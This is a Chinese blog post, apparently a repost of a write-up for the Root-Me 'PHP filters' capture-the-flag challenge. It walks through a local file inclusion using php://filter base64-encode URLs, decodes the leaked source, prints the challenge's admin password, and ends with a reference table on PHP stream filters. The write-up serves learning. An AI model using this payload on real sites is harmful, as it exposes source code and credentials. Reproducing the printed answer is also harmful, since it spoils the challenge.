<!--yml
category: 未分类
date: 2022-04-26 14:40:15
-->

# CTF-rootme 题解之PHP filters_weixin_30384031的博客-CSDN博客

> 来源：[https://blog.csdn.net/weixin_30384031/article/details/99600336](https://blog.csdn.net/weixin_30384031/article/details/99600336)

LINK:[https://www.root-me.org/en/Challenges/Web-Server/PHP-filters](https://www.root-me.org/en/Challenges/Web-Server/PHP-filters)

　　  [https://challenge01.root-me.org/web-serveur/ch12/](https://challenge01.root-me.org/web-serveur/ch12/)

 Referrence:[https://www.leavesongs.com/PENETRATION/php-filter-magic.html](https://www.leavesongs.com/PENETRATION/php-filter-magic.html)

　　  　　　[https://blog.csdn.net/qq_29419013/article/details/81201494](https://blog.csdn.net/qq_29419013/article/details/81201494) 　

1、测试文件包含漏洞是否存在

访问https://challenge01.root-me.org/web-serveur/ch12/?inc=test.php页面返回如下信息(文件不存在):

```
Warning: include(test.php): failed to open stream: No such file or directory in /challenge/web-serveur/ch12/ch12.php on line 26

Warning: include(): Failed opening 'test.php' for inclusion (include_path='.:/usr/share/php') in /challenge/web-serveur/ch12/ch12.php on line 26 
```

访问https://challenge01.root-me.org/web-serveur/ch12/?inc=ch12.php页面返回正常.

 证明此页面存在本地文件(LFI)包含漏洞,如果我正常用LFI去读ch12.php文件 是无法读取它的源码 它会被当做php文件被执行,可以使用**php://filter/read=convert.base64-encode/resource=**来读取文件的base64编码的源码。

2.构造访问链接https://challenge01.root-me.org/web-serveur/ch12/?inc=php://filter/read=convert.base64-encode/resource=ch12.php得到如下HASH值：

```
PD9waHAKCiRpbmM9ImFjY3VlaWwucGhwIjsKaWYgKGlzc2V0KCRfR0VUWyJpbmMiXSkpIHsKICAgICRpbmM9JF9HRVRbJ2luYyddOwogICAgaWYgKGZpbGVfZXhpc3RzKCRpbmMpKXsKCSRmPWJhc2VuYW1lKHJlYWxwYXRoKCRpbmMpKTsKCWlmICgkZiA9PSAiaW5kZXgucGhwIiB8fCAkZiA9PSAiY2gxMi5waHAiKXsKCSAgICAkaW5jPSJhY2N1ZWlsLnBocCI7Cgl9CiAgICB9Cn0KCmluY2x1ZGUoImNvbmZpZy5waHAiKTsKCgplY2hvICcKICA8aHRtbD4KICA8Ym9keT4KICAgIDxoMT5GaWxlTWFuYWdlciB2IDAuMDE8L2gxPgogICAgPHVsPgoJPGxpPjxhIGhyZWY9Ij9pbmM9YWNjdWVpbC5waHAiPmhvbWU8L2E

```

使用下面的命令来解码ch12.php这个文件的源代码得到如下信息：

```
[ BlackArch Downloads ]# echo -n 'PD9waHAKCiRpbmM9ImFjY3VlaWwucGhwIjsKaWYgKGlzc2V0KCRfR0VUWyJpbmMiXSkpIHsKICAgICRpbmM9JF9HRVRbJ2luYyOwogICAgaWYgKGZpbGVfZXhpc3RzKCRpbmMpKXsKCSRmPWJhc2VuYW1lKHJlYWxwYXRoKCRpbmMpKTsKCWlmICgkZiA9PSAiaW5kZXgucGhwIiB8fCAkZiA9PSAiY2gxMi5waHAiKXsKCSAgICAkaW5jPSJhY2N1ZWlsLnBocCI7Cgl9CiAgICB9Cn0KCmluY2x1ZGUoImNvbmZpZy5waHAiKTsKCgplY2hvICcKICA8aHRtbD4KICA8Ym9keT4KICAgIDxoMT5GaWxlTWFuYWdlciB2IDAuMDE8L2gxPgogICAgPHVsPgoJPGxpPjxhIGhyZWY9Ij9pbmM9YWNjdWVpbC5waHAiPmhvbWU8L2E' |base64 -d
<?php

$inc="accueil.php";
if (isset($_GET["inc"])) {
    $inc=$_GET['inc'];
    if (file_exists($inc)){
	$f=basename(realpath($inc));
	if ($f == "index.php" || $f == "ch12.php"){
	    $inc="accueil.php";
	}
    }
}

include("config.php");

echo '
  <html>
  <body>
    <h1>FileManager v 0.01</h1>
    <ul>
	<li><a href="?inc=accueil.php">home</abase64: invalid inpu

```

 访问https://challenge01.root-me.org/web-serveur/ch12/?inc=php://filter/read=convert.base64-encode/resource=config.php：得到hash如下：

```
PD9waHAKCiR1c2VybmFtZT0iYWRtaW4iOwokcGFzc3dvcmQ9IkRBUHQ5RDJta3kwQVBBRiI7Cgo/Pg==
```

 **解码得到admin的密码为**DAPt9D2mky0APAF

```
[ BlackArch Downloads ]# echo -n 'PD9waHAKCiR1c2VybmFtZT0iYWRtaW4iOwokcGFzc3dvcmQ9IkRBUHQ5RDJta3kwQVBBRiI7Cgo/Pg==' |base64 -d
<?php

$username="admin";
$password="DAPt9D2mky0APAF";

?>

```

**附：**

php://filter 是php中独有的一个协议，可以作为一个中间流来处理其他流，可以进行任意文件的读取；根据名字，filter，可以很容易想到这个协议可以用来过滤一些东西；

使用不同的参数可以达到不同的目的和效果：

| 名称 | 描述 | 备注 |
| --- | :-- | :-- |
| resource=<要过滤的数据流> | 指定了你要筛选过滤的数据流。 | 必选 |
| read=<读链的筛选列表> | 可以设定一个或多个过滤器名称，以管道符（&#124;）分隔。 | 可选 |
| write=<写链的筛选列表> | 可以设定一个或多个过滤器名称，以管道符（&#124;）分隔。 | 可选 |
| <；两个链的筛选列表> | 任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。 |   |

php://filter筛选过滤应用： 

1、 字符串过滤器：

*   :string.rot13 对字符串执行ROT13转换
*   string.toupper转换为大写
*   string.tolower 转换为小写
*   string.strip_tags去除html和php标记

2、 转换过滤器：

*   **convert.base64-encode & convert.base64-decode** **：****base64****编码****/****解码**
*   **convert.quoted-printable-encode & convert.quoted-printable-decode****：**将 quoted-printable 字符串转换为 8-bit 字符串

3、 压缩过滤器：

*   *zlib.deflate***和***zlib.inflate*
*   *bzip2.compress***和***bzip2.decompress*

4、 加密过滤器：

*   mcrypt.tripledes和mdecrypt.tripledes等

```
readfile("php://filter/read=string.toupper/resource=http://www.example.com");//将www.example.com中的内容转换为大写后输出

file_put_contents("php://filter/write=string.rot13/resource=example.txt","Hello World");//将字符串”hello world”经过rot13编码后写入example.txt
```